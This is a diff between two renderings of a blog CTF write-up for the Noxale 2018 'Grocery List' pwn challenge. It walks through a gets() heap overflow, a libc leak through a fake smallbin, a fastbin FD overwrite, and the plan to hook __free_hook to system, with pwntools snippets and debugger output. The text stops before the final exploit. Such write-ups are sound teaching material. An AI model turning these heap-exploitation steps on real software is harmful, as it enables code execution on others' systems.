@@ -1,161 +1,23 @@
-<!DOCTYPE html>
-<html lang="en">
-<head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article# website: http://ogp.me/ns/website#">
-    <meta http-equiv="content-type" content="text/html; charset=utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-    <meta name="description" content="">
-    <meta property="og:title" content="Noxale CTF: Grocery List (pwn)">
-    
-    <meta property="og:type" content="article">
-    <meta property="article:published_time" content="2018-09-09">
-    
-    <meta property="og:description" content="">
-    <meta property="og:url" content="https://segflow.github.io/post/noxale-ctf-grocery_list/">
-    <meta property="og:site_name" content="Segflow">
-    
-    <meta property="og:tags" content="writeup">
-    
-    <meta property="og:tags" content="ctf">
-    
-    <meta property="og:tags" content="pwn">
-    
-    <meta property="og:tags" content="rop">
-    
-    <meta property="og:tags" content="heap">
-    
-    <meta name="generator" content="Hugo 0.59.1" />
-
-    
-    <title>Noxale CTF: Grocery List (pwn) &middot; Segflow</title>
-    
-
-    
-    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-    
-    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/styles/default.min.css">
-    
-    <link rel="stylesheet" href="https://segflow.github.io/css/style.css">
-    
-    <link href="https://segflow.github.io/index.xml" rel="alternate" type="application/rss+xml" title="Segflow" />
-    
-    
-    <link rel="icon" href="https://segflow.github.io/favicon.ico" />
-    
-
-    
-    
-</head>
-<body>
-
-<nav class="navbar navbar-default navbar-fixed-top visible-xs">
-	<div class="container-fluid">
-		<div class="navbar-header">
-			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
-				<span class="sr-only">Toggle navigation</span>
-				<span class="icon-bar"></span>
-				<span class="icon-bar"></span>
-				<span class="icon-bar"></span>
-			</button>
-			
-				<a class="navbar-brand" href="https://segflow.github.io/">Segflow</a>
-			
-		</div>
-		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
-			<ul class="nav navbar-nav">
-				
-				
-					<li><a href="https://segflow.github.io//">Home</a></li>
-				
-					<li><a href="https://segflow.github.io/post/">Posts</a></li>
-				
-					<li><a href="https://segflow.github.io/resume.pdf">Resume</a></li>
-				
-			</ul>
-		</div>
-	</div>
-</nav>
-<div class="container-fluid">
-	<div class="row">
-		<div id="menu" class="hidden-xs col-sm-3 col-md-3">
-	<div id="menu-content" class="vertical-align">
-		
-			<h1 class="text-center"><a href="https://segflow.github.io/">Segflow</a></h1>
-		
-		
-		
-			<small class="text-center center-block">Assel Meher</small>
-		
-		
-		
-			<img id="profile-pic" src="https://segflow.github.io//img/hacker_emblem.png" alt="My Picture" class="img-circle center-block">
-		
-		<div id="social" class="text-center">
-			
-				<a href="https://github.com/segflow"><i class="fa fa-github fa-2x"></i></a>
-			
-				<a href="https://www.linkedin.com/in/meher-assel-0122798a"><i class="fa fa-linkedin fa-2x"></i></a>
-			
-				<a href="https://twitter.com/segfl0w"><i class="fa fa-twitter fa-2x"></i></a>
-			
-
-			<a href="mailto:asselmeher@gmail.com"><i class="fa fa-envelope-o fa-2x"></i></a>
-		</div>
-		<div id="links" class="text-center">
-			
-			
-				<a href="https://segflow.github.io//">Home</a>
-			
-				<a href="https://segflow.github.io/post/">Posts</a>
-			
-				<a href="https://segflow.github.io/resume.pdf">Resume</a>
-			
-		</div>
-	</div>
-</div>
-
-		<div id="content" class="col-xs-12 col-sm-9 col-md-9">
-			<div class="row">
-				<div id="post" class="col-sm-offset-1 col-sm-10 col-md-10 col-lg-10">
-
-<main>
-	<header>
-		<h1>Noxale CTF: Grocery List (pwn)</h1>
-	</header>
-
-	<article>
-		<p>In this challenge, we are given a service IP and PORT, to which we can connect using <code>netcat</code> or any similar tool.
-We are also provided with an <code>ELF</code> file.</p>
-
-<p>The task description is the following:</p>
-
-<blockquote>
-<p>I really hate it when I forget what I wanted to buy.</p>
-
-<p>That&rsquo;s why I created the FASTEST Grocery List in the world.</p>
-
-<p>Go check it out.</p>
-
-<p>nc chal.noxale.com 1232</p>
-
-<p><a href="../../ctf-files/34c3-ctf-2017/noxale-ctf-2018/GroceryList">Challenge files</a></p>
-</blockquote>
-
-<blockquote class="twitter-tweet"><p lang="en" dir="ltr">I really enjoyed the GroceryList challenge of <a href="https://twitter.com/hashtag/noxale?src=hash&amp;ref_src=twsrc%5Etfw">#noxale</a> CTF.  <br>Here is my writeup for it <a href="https://t.co/F3rKe1T1PS">https://t.co/F3rKe1T1PS</a></p>&mdash; Assel Meher (@segfl0w) <a href="https://twitter.com/segfl0w/status/1038879867725651968?ref_src=twsrc%5Etfw">September 9, 2018</a></blockquote>
-<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
-
-
-<p>The file is a 64 bits Linux executable with all protections enabled:</p>
-
-<pre><code class="language-shell">Arch:     amd64-64-little
-RELRO:    Full RELRO
-Stack:    Canary found
-NX:       NX enabled
-PIE:      PIE enabled
-</code></pre>
-
-<p>To get a feeling what the binary is doing, I played with it a little bit.</p>
-
-<pre><code>What would you like to do?
+<!doctype html><html lang=en><head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article# website: http://ogp.me/ns/website#"><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta name=description content><meta property="og:title" content="Noxale CTF: Grocery List (pwn)"><meta property="og:type" content="article"><meta property="article:published_time" content="2018-09-09"><meta property="og:description" content><meta property="og:url" content="https://segflow.github.io/post/noxale-ctf-grocery_list/"><meta property="og:site_name" content="Segflow"><meta property="og:tags" content="writeup"><meta property="og:tags" content="ctf"><meta property="og:tags" content="pwn"><meta property="og:tags" content="rop"><meta property="og:tags" content="heap"><meta name=generator content="Hugo 0.147.2"><title>Noxale CTF: Grocery List (pwn) &#183; Segflow</title>
+<link rel=stylesheet href=//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css><link rel=stylesheet href=//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/styles/default.min.css><link rel=stylesheet href=https://segflow.github.io/css/style.css><link rel=icon href=https://segflow.github.io/favicon.ico></head><body><nav class="navbar navbar-default navbar-fixed-top visible-xs"><div class=container-fluid><div class=navbar-header><button type=button class="navbar-toggle collapsed" data-toggle=collapse data-target=#bs-example-navbar-collapse-1>
+<span class=sr-only>Toggle navigation</span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+</button>
+<a class=navbar-brand href=https://segflow.github.io/>Segflow</a></div><div class="collapse navbar-collapse" id=bs-example-navbar-collapse-1><ul class="nav navbar-nav"><li><a href=https://segflow.github.io//>Home</a></li><li><a href=https://segflow.github.io/post/>Posts</a></li><li><a href=https://segflow.github.io/resume.pdf>Resume</a></li></ul></div></div></nav><div class=container-fluid><div class=row><div id=menu class="hidden-xs col-sm-3 col-md-3"><div id=menu-content class=vertical-align><h1 class=text-center><a href=https://segflow.github.io/>Segflow</a></h1><small class="text-center center-block">Assel Meher</small>
+<img id=profile-pic src=https://segflow.github.io//img/hacker_emblem.png alt="My Picture" class="img-circle center-block"><div id=social class=text-center><a href=https://github.com/segflow><i class="fa fa-github fa-2x"></i></a>
+<a href=https://www.linkedin.com/in/meher-assel-0122798a><i class="fa fa-linkedin fa-2x"></i></a>
+<a href=https://twitter.com/segfl0w><i class="fa fa-twitter fa-2x"></i></a>
+<a href=mailto:asselmeher@gmail.com><i class="fa fa-envelope-o fa-2x"></i></a></div><div id=links class=text-center><a href=https://segflow.github.io//>Home</a>
+<a href=https://segflow.github.io/post/>Posts</a>
+<a href=https://segflow.github.io/resume.pdf>Resume</a></div></div></div><div id=content class="col-xs-12 col-sm-9 col-md-9"><div class=row><div id=post class="col-sm-offset-1 col-sm-10 col-md-10 col-lg-10"><main><header><h1>Noxale CTF: Grocery List (pwn)</h1></header><article><p>In this challenge, we are given a service IP and PORT, to which we can connect using <code>netcat</code> or any similar tool.
+We are also provided with an <code>ELF</code> file.</p><p>The task description is the following:</p><blockquote><p>I really hate it when I forget what I wanted to buy.</p></blockquote><blockquote><p>That&rsquo;s why I created the FASTEST Grocery List in the world.</p></blockquote><blockquote><p>Go check it out.</p></blockquote><blockquote><p>nc chal.noxale.com 1232</p></blockquote><blockquote><p><a href=../../content-assets/noxale-ctf-grocery_list/GroceryList>Challenge files</a></p></blockquote><blockquote class=twitter-tweet><p lang=en dir=ltr>I really enjoyed the GroceryList challenge of <a href="https://twitter.com/hashtag/noxale?src=hash&amp;ref_src=twsrc%5Etfw">#noxale</a> CTF.<br>Here is my writeup for it <a href=https://t.co/F3rKe1T1PS>https://t.co/F3rKe1T1PS</a></p>&mdash; Assel Meher (@segfl0w) <a href="https://twitter.com/segfl0w/status/1038879867725651968?ref_src=twsrc%5Etfw">September 9, 2018</a></blockquote><script async src=https://platform.twitter.com/widgets.js></script><p>The file is a 64 bits Linux executable with all protections enabled:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Arch:     amd64-64-little
+</span></span><span style=display:flex><span>RELRO:    Full RELRO
+</span></span><span style=display:flex><span>Stack:    Canary found
+</span></span><span style=display:flex><span>NX:       NX enabled
+</span></span><span style=display:flex><span>PIE:      PIE enabled
+</span></span></code></pre></div><p>To get a feeling what the binary is doing, I played with it a little bit.</p><pre tabindex=0><code>What would you like to do?
 1. Print the list
 2. Add item to the list
 3. Add empty items to the list
@@ -179,124 +41,78 @@ What would you like to do?
 5. Edit an existing item
 6. Add default example
 7. Exit
-</code></pre>
-
-<p>The binary allows us to create/edit/delete and batch create items. Reversing the main loop using <code>IDA</code> the code looks like:</p>
-
-<pre><code class="language-C">int choice;
-char def_item[12] = &quot;Grocery Item&quot;;
-do {
-  puts_(&quot;What would you like to do?&quot;);
-  puts_(&quot;1. Print the list&quot;);
-  puts_(&quot;2. Add item to the list&quot;);
-  puts_(&quot;3. Add empty items to the list&quot;);
-  puts_(&quot;4. Remove an item from the list&quot;);
-  puts_(&quot;5. Edit an existing item&quot;);
-  puts_(&quot;6. Add default example&quot;);
-  puts_(&quot;7. Exit&quot;);
-  fflush(stdin);
-  scanf(&quot;%d&quot;, &amp;choice);
-  switch ( choice ) {
-    case 1:
-      dump_items();
-      break;
-    case 2:
-      add_item();
-      break;
-    case 3:
-      add_empty_items();
-      break;
-    case 4:
-      delete_item();
-      break;
-    case 5:
-      edit_item();
-      break;
-    case 6:
-      add_default_item(def_item);
-      break;
-    case 7:
-      puts_(&quot;Goodbye\n&quot;);
-      free_all();
-      break;
-    default:
-      puts(&quot;Invalid choice&quot;);
-      break;
-  }
-} while ( choice != 7 );
-</code></pre>
-
-<p>At maximum, we can only have 20 items, which are <code>malloc</code>&lsquo;ed and stored in a global array that resides within the <code>.bss</code> segment of the binary.</p>
-
-<p>There is 3 types of items: <code>small = 0x10</code>, <code>medium = 0x38</code>, and <code>large = 0x60</code>.</p>
-
-<p>We notice that all the sizes are within the <code>fast bins</code> size range so we will be dealing with fast bins only. Now we understand why the word <strong>FASTEST</strong> was in bold in the challenge description ;).</p>
-
-<p>Content reading is done using <code>gets</code>, which is known to be insecure because it doesn&rsquo;t do any bound check. This allows us to write out of the malloc&rsquo;ed item chunks and thus overwriting stuff.</p>
-
-<h1 id="fastbin-attack">Fastbin Attack</h1>
-
-<p>Based on the information we have, and what we can do, we can see that this is a typical fastbin attack, where we need to overwrite a free chunk <strong>FD</strong> pointer by a fake one that we can use to achieve an arbitrary read/write.</p>
-
-<p>But since <code>PIE</code> and <code>ASLR</code> are enabled, we need to defeat them first by leaking some addresses.</p>
-
-<p>We know that <code>small bins</code> will have a pointer to <code>main_arena</code> in their <strong>FD</strong> and <strong>BK</strong> pointers once free&rsquo;ed, so if we manage to craft a fake <code>smallbin</code>, free it and then create a new empty item, the item will be located in the same region as the previously free&rsquo;ed fake smallbin, so by printing the item we would have leaked a <code>libc</code> address. To do so, we can overwrite into a chunk metadata to corrupt it&rsquo;s <code>size</code> field and make it looks like a <code>smallbin</code>.</p>
-
-<p>The function I used to do the leak looks as follow:</p>
-
-<pre><code class="language-python">def getheapleak():
-    add_item(1, &quot;AAAAAAA&quot;)
-    add_item(3, &quot;AAAAAAA&quot;)
-    add_item(3, &quot;AAAAAAA&quot;)
-    add_item(1, &quot;AAAAAAA&quot;)
-
-    fake_chunk = &quot;A&quot;*24 + p64(0xe1)
-    edit_item(0, fake_chunk)
-
-    delete_item(1)
-
-    add_empty_items(2, 1)
-
-    r.sendline(&quot;1&quot;)
-    r.recvuntil(&quot;3. &quot;)
-
-    leak = r.recvline(keepends=False)
-    leak = leak + (&quot;\x00&quot; * (8 - len(leak)))
-    r.recvuntil(&quot;Exit\n&quot;)
-
-    return u64(leak)
-</code></pre>
-
-<p>With the leaked address we can locate <code>libc</code> base address and the binary <code>PIE</code> base. Thus defeating both <code>ASLR</code> and <code>PIE</code>.</p>
-
-<p>The next step is to free an item so that the <code>fastbin</code> list get populated and then overwrite the free&rsquo;ed item (by editing the previous one) <strong>FD</strong> pointer by a fake chunk.</p>
-
-<pre><code class="language-python">add_empty_items(1, 4)
-delete_item(7)
-</code></pre>
-
-<p>Now our fastbin contains this:</p>
-
-<pre><code>0x20: 0x5555557584e0 ◂— 0x0 # the just free'ed item
+</code></pre><p>The binary allows us to create/edit/delete and batch create items. Reversing the main loop using <code>IDA</code> the code looks like:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#66d9ef>int</span> choice;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> def_item[<span style=color:#ae81ff>12</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Grocery Item&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>do</span> {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts_</span>(<span style=color:#e6db74>&#34;What would you like to do?&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts_</span>(<span style=color:#e6db74>&#34;1. Print the list&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts_</span>(<span style=color:#e6db74>&#34;2. Add item to the list&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts_</span>(<span style=color:#e6db74>&#34;3. Add empty items to the list&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts_</span>(<span style=color:#e6db74>&#34;4. Remove an item from the list&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts_</span>(<span style=color:#e6db74>&#34;5. Edit an existing item&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts_</span>(<span style=color:#e6db74>&#34;6. Add default example&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts_</span>(<span style=color:#e6db74>&#34;7. Exit&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>fflush</span>(stdin);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%d&#34;</span>, <span style=color:#f92672>&amp;</span>choice);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>switch</span> ( choice ) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>dump_items</span>();
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>2</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>add_item</span>();
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>3</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>add_empty_items</span>();
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>4</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>delete_item</span>();
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>5</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>edit_item</span>();
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>6</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>add_default_item</span>(def_item);
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>7</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>puts_</span>(<span style=color:#e6db74>&#34;Goodbye</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>free_all</span>();
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>default</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Invalid choice&#34;</span>);
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>} <span style=color:#66d9ef>while</span> ( choice <span style=color:#f92672>!=</span> <span style=color:#ae81ff>7</span> );
+</span></span></code></pre></div><p>At maximum, we can only have 20 items, which are <code>malloc</code>&lsquo;ed and stored in a global array that resides within the <code>.bss</code> segment of the binary.</p><p>There is 3 types of items: <code>small = 0x10</code>, <code>medium = 0x38</code>, and <code>large = 0x60</code>.</p><p>We notice that all the sizes are within the <code>fast bins</code> size range so we will be dealing with fast bins only. Now we understand why the word <strong>FASTEST</strong> was in bold in the challenge description ;).</p><p>Content reading is done using <code>gets</code>, which is known to be insecure because it doesn&rsquo;t do any bound check. This allows us to write out of the malloc&rsquo;ed item chunks and thus overwriting stuff.</p><h1 id=fastbin-attack>Fastbin Attack</h1><p>Based on the information we have, and what we can do, we can see that this is a typical fastbin attack, where we need to overwrite a free chunk <strong>FD</strong> pointer by a fake one that we can use to achieve an arbitrary read/write.</p><p>But since <code>PIE</code> and <code>ASLR</code> are enabled, we need to defeat them first by leaking some addresses.</p><p>We know that <code>small bins</code> will have a pointer to <code>main_arena</code> in their <strong>FD</strong> and <strong>BK</strong> pointers once free&rsquo;ed, so if we manage to craft a fake <code>smallbin</code>, free it and then create a new empty item, the item will be located in the same region as the previously free&rsquo;ed fake smallbin, so by printing the item we would have leaked a <code>libc</code> address. To do so, we can overwrite into a chunk metadata to corrupt it&rsquo;s <code>size</code> field and make it looks like a <code>smallbin</code>.</p><p>The function I used to do the leak looks as follow:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getheapleak</span>():
+</span></span><span style=display:flex><span>    add_item(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;AAAAAAA&#34;</span>)
+</span></span><span style=display:flex><span>    add_item(<span style=color:#ae81ff>3</span>, <span style=color:#e6db74>&#34;AAAAAAA&#34;</span>)
+</span></span><span style=display:flex><span>    add_item(<span style=color:#ae81ff>3</span>, <span style=color:#e6db74>&#34;AAAAAAA&#34;</span>)
+</span></span><span style=display:flex><span>    add_item(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;AAAAAAA&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    fake_chunk <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;A&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>24</span> <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0xe1</span>)
+</span></span><span style=display:flex><span>    edit_item(<span style=color:#ae81ff>0</span>, fake_chunk)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    delete_item(<span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    add_empty_items(<span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;1&#34;</span>)
+</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;3. &#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    leak <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvline(keepends<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
+</span></span><span style=display:flex><span>    leak <span style=color:#f92672>=</span> leak <span style=color:#f92672>+</span> (<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>8</span> <span style=color:#f92672>-</span> len(leak)))
+</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;Exit</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> u64(leak)
+</span></span></code></pre></div><p>With the leaked address we can locate <code>libc</code> base address and the binary <code>PIE</code> base. Thus defeating both <code>ASLR</code> and <code>PIE</code>.</p><p>The next step is to free an item so that the <code>fastbin</code> list get populated and then overwrite the free&rsquo;ed item (by editing the previous one) <strong>FD</strong> pointer by a fake chunk.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>add_empty_items(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>4</span>)
+</span></span><span style=display:flex><span>delete_item(<span style=color:#ae81ff>7</span>)
+</span></span></code></pre></div><p>Now our fastbin contains this:</p><pre tabindex=0><code>0x20: 0x5555557584e0 ◂— 0x0 # the just free&#39;ed item
 0x30: 0x0
 0x40: 0x0
 0x50: 0x0
 0x60: 0x0
 0x70: 0x0
 0x80: 0x0
-</code></pre>
-
-<p>Since <strong>FD</strong> needs to point to a valid fastbin chunk that has the size 0x20, this will put some limitations to what we can write, the validation check done by <code>libc</code> is as follow:</p>
-
-<ul>
-<li>if a chunk <code>A</code> is in a fastbin list of size <code>X</code>, then <code>A-&gt;size &gt;&gt; 4 - 2</code> needs to be equal to <code>X</code></li>
-</ul>
-
-<p>This looks like a hard condition to fulfill, but it&rsquo;s pretty easy to find such a valid fake chunk. Since the <code>size</code> field is at offset <code>8</code> of the struct, we need to find an address <code>A</code> such as the data at <code>A + 8</code> contains a valid chunk size.</p>
-
-<p>powered by <code>gdb</code> I did find a valid address that fulfills that condition. And guess what? it&rsquo;s only 3 bytes far from the global <code>items_list</code> array</p>
-
-<pre><code>pwndbg&gt; x/5gx 0x55555575602d
+</code></pre><p>Since <strong>FD</strong> needs to point to a valid fastbin chunk that has the size 0x20, this will put some limitations to what we can write, the validation check done by <code>libc</code> is as follow:</p><ul><li>if a chunk <code>A</code> is in a fastbin list of size <code>X</code>, then <code>A->size >> 4 - 2</code> needs to be equal to <code>X</code></li></ul><p>This looks like a hard condition to fulfill, but it&rsquo;s pretty easy to find such a valid fake chunk. Since the <code>size</code> field is at offset <code>8</code> of the struct, we need to find an address <code>A</code> such as the data at <code>A + 8</code> contains a valid chunk size.</p><p>powered by <code>gdb</code> I did find a valid address that fulfills that condition. And guess what? it&rsquo;s only 3 bytes far from the global <code>items_list</code> array</p><pre tabindex=0><code>pwndbg&gt; x/5gx 0x55555575602d
 0x55555575602d:    0xaaab0978e0000000    0x000000000000002a
 0x55555575603d:    0x5555758430000000    0x55557584c0000055
 0x55555575604d:    0x5555758530000055
@@ -306,19 +122,13 @@ pwndbg&gt; x/10gx 0x5555557584c0
 0x5555557584e0:    0x0000000000000000    0x0000000000000021 &lt;- item 7 (0x5555557584f0 is what we want to corrupt)
 0x5555557584f0:    0x0000000000000000    0x00002aaaab097ba8
 0x555555758500:    0x0000000000000000    0x0000000000000021
-</code></pre>
-
-<p>With that, we can edit the 6&rsquo;th item to corrupt the <strong>FD</strong> of the 7th item.</p>
-
-<pre><code class="language-python">fake_fast_chunk = pie_base + 0x20202d
-payload = &quot;B&quot; * 16          # Fill current chunk
-payload += p64(0)           # Prev size
-payload += p64(0x21)        # Chunk size (keep the old one)
-payload += p64(fake_fast_chunk)  # FD pointer
-edit_item(6, payload)
-</code></pre>
-
-<pre><code>pwndbg&gt; fastbins
+</code></pre><p>With that, we can edit the 6&rsquo;th item to corrupt the <strong>FD</strong> of the 7th item.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>fake_fast_chunk <span style=color:#f92672>=</span> pie_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x20202d</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;B&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>16</span>          <span style=color:#75715e># Fill current chunk</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)           <span style=color:#75715e># Prev size</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x21</span>)        <span style=color:#75715e># Chunk size (keep the old one)</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(fake_fast_chunk)  <span style=color:#75715e># FD pointer</span>
+</span></span><span style=display:flex><span>edit_item(<span style=color:#ae81ff>6</span>, payload)
+</span></span></code></pre></div><pre tabindex=0><code>pwndbg&gt; fastbins
 0x20: 0x5555557584e0 —▸ 0x55555575602d (our fake chunk) ◂— 0x5555758430000000
 0x30: 0x0
 0x40: 0x0
@@ -332,141 +142,55 @@ pwndbg&gt; x/10gx 0x5555557584c0
 0x5555557584e0:    0x0000000000000000    0x0000000000000021 &lt;- item 7
 0x5555557584f0:    0x000055555575602d    0x00002aaaab097b00
 0x555555758500:    0x0000000000000000    0x0000000000000021
-</code></pre>
-
-<p>Now if we allocate 2 new items (small size), the second one will be at our fake chunk. Since our fake chunk is 3 bytes before the global <code>items_list</code> array, by editing it we will place fake addresses in the <code>items_list</code>.</p>
-
-<p>We will use that to insert fake items address into the <code>items_list</code>, and thus have arbitrary read/write since we can print and edit items.</p>
-
-<p>We cannot edit a <a href="https://en.wikipedia.org/wiki/Global_Offset_Table">GOT</a> entry since the binary is <code>Full RELRO</code>, so the plan was to overwrite the pointer <code>__free_hook</code> with the address of <code>system</code>, which will make any call to <code>free(SOMETHING)</code> also calls <code>system(SOMETHING)</code>.</p>
-
-<p>To do this we need to have <code>system</code> and <code>__free_hook</code> addresses. By leaking the addresses of two different <code>libc</code> functions we can know what <code>libc</code> version is being used and thus calculate the addresses of both <code>system</code> and <code>__free_hook</code>, I went for leaking the addresses of <code>puts</code> and <code>getchar</code></p>
-
-<pre><code class="language-python">overwrite = &quot;PAD&quot;
-overwrite += p64(pie_base + e.got['puts'])    # items[0]
-overwrite += p64(pie_base + e.got['getchar'])  # items[1]
-edit_item(8, overwrite)
-r.sendline(&quot;1&quot;)
-r.recvuntil(&quot;0. &quot;)
-leak = r.recvline(keepends=False)
-puts = u64(leak.ljust(8, &quot;\x00&quot;))
-r.recvuntil(&quot;1. &quot;)
-leak = r.recvline(keepends=False)
-getchar = u64(leak.ljust(8, &quot;\x00&quot;))
-</code></pre>
-
-<p>Running it we get:</p>
-
-<pre><code class="language-shell">&gt; $ python exploit.py
-[*] '/MacOsHome/Desktop/CTFs/noxale-2018/grocery_list/GroceryList'
-    Arch:     amd64-64-little
-    RELRO:    Full RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      PIE enabled
-[+] Starting local process './GroceryList': pid 4407
-[!] ASLR is disabled!
-[4407]
-[*] Heap leak : 0x2aaaab097c48
-[*] PIE Base  : 0x555555554000
-[*] LIBC base : 0x2aaaaacd3000
-[*] items bss : 0x555555756040
-[*] Fake Fast chunk: 0x55555575602d
-[*] puts    : 0x2aaaaad42690
-[*] getchar : 0x2aaaaad49160
-</code></pre>
-
-<p>Using <a href="https://libc.blukat.me/">libc_search</a> we now know that the libc being used is 2.23-ubuntu and that the offsets of <code>system</code> and <code>__free_hook</code> are <code>0x45390</code> and <code>0x3c67a8</code> respectively.</p>
-
-<p>Now we just need to place <code>__free_hook</code> in <code>items[0]</code> using the same trick as before and edit it to write the address of <code>system</code>.</p>
-
-<p>The following python code is the final exploit. I&rsquo;m using <a href="https://github.com/Gallopsled/pwntools">Pwntools</a> to do this since it makes network programming much more easy and funny.</p>
-
